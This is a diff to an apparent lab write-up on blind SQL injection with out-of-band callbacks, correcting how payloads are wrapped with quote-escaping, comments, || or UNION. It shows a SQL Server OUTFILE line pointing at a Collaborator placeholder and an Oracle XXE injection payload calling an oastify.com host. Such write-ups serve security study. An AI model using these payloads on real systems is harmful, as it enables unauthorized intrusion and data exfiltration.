@@ -37,7 +37,7 @@ SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ```
 # Step 2 create payloads
 
-Okay, I am going to build a payload for each sql version and see which one I can get to callback. Keep in mind that they above payloads are actual sql queries, to make them injectable we are going to need to add `'<payload--` to escape the query and comment out the rest of the query. Ontop of that we need a way to combine it with the previous query either with `||` or a `UNION` statement. This makes the actual payload"
+Okay, I am going to build a payload for each sql version and see which one I can get to callback. Keep in mind that they above payloads are actual sql queries, to make them injectable we are going to need to add `'<payload>--` to escape the query and comment out the rest of the query. Ontop of that we need a way to combine it with the previous query either with `' || <payload>--` or a `' UNION <payload>--` statement. This makes the actual payload
 
 ```sql
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gm6ytjrk7u69jrwzny8ft5efm6sxgu4j.oastify.com/"> %remote;]>'),'/l') FROM dual--
